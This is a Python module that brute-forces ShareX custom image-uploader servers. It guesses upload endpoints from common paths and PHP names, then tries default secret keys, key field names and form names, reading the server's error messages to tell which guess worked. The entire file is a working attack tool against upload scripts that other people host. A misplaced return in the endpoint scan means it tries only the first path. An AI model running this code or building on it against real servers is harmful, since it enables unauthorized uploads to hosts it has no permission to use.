import requests
import io

from core.sharex import ShareX


class Brute:

    COMMON_SECRETS = ('9ge9ag99135213tgedavxgfedsaxeg', '', 'secret', 'key', 'mySecret', 'myOtherSecret', '*jk2m29s9K2jH)(UIDQ#@')
    COMMON_PATHS = ('', 'i', 'ss', 'file', 'files', 'upload')
    COMMON_ENDPOINTS = ('upload.php', 'up.php', 'sharex.php', 'file.php', 'files.php', 'fileupload.php', 'image.php')
    COMMON_FIELD_NAMES = ('secret', 'key', 'apiKey', 'apikey', 'token', 'api_key')
    COMMON_FORM_NAMES = ('sharex', 'file', 'files', 'image')

    @staticmethod
    def is_required(url):
        """ Check if it is required to brute force secret key and secret key field name """
        try:
            res = requests.get(url)
            return not ShareX.Errors.UPLOAD_FAILED.value['content'].lower() in res.text.lower()
        except Exception:
            return True

    @staticmethod
    def endpoint(url, timeout=2500):
        """ Brute force custom image uploader endpoint """
        if url[-1] != '/':
            url += '/'

        for path in Brute.COMMON_PATHS:
            for endpoint in Brute.COMMON_ENDPOINTS:
                _url = url + path + ('/' if len(path) > 0 else '') + endpoint

                try:
                    res = requests.get(_url, timeout=timeout/1000)

                    for e in ShareX.Errors:
                        if e.value['content'].lower() in res.text.lower():
                            return _url
                    else:
                        if res.status_code == 200:
                            return _url
                except Exception:
                    pass

            return None

    @staticmethod
    def secret(url, field_name):
        """ Brute force custom image uploader secret key """
        file_data = io.BytesIO(b'Hello world!')
        invalid_file_name = 'AAAA'

        for secret in Brute.COMMON_SECRETS:
            try:
                res = ShareX.upload(url, file_data, file_name=invalid_file_name, secret=secret, field_name=field_name)

                if ShareX.Errors.UPLOAD_FAILED.value['content'].lower() in res.text.lower():
                    return secret
            except Exception:
                pass

        return None

    @staticmethod
    def field_name(url):
        """ Brute force custom image uploader secret key POST data field name """
        file_data = io.BytesIO(b'Hello world!')
        secret = 'abc'

        for field_name in Brute.COMMON_FIELD_NAMES:
            try:
                res = ShareX.upload(url, file_data, field_name=field_name, secret=secret)
                if ShareX.Errors.INVALID_SECRET.value['content'].lower() in res.text.lower():
                    return field_name
            except Exception:
                pass

        return None

    @staticmethod
    def form_name(url, secret, field_name):
        """ Brute force custom image uploader multipart file form name """
        file_data = io.BytesIO(b'Hello world!')

        for form_name in Brute.COMMON_FORM_NAMES:
            try:
                res = ShareX.upload(url, file_data, form_name=form_name, field_name=field_name, secret=secret)

                if not ShareX.Errors.UPLOAD_FAILED.value['content'].lower() in res.text.lower():
                    return form_name
            except Exception:
                pass

        return None
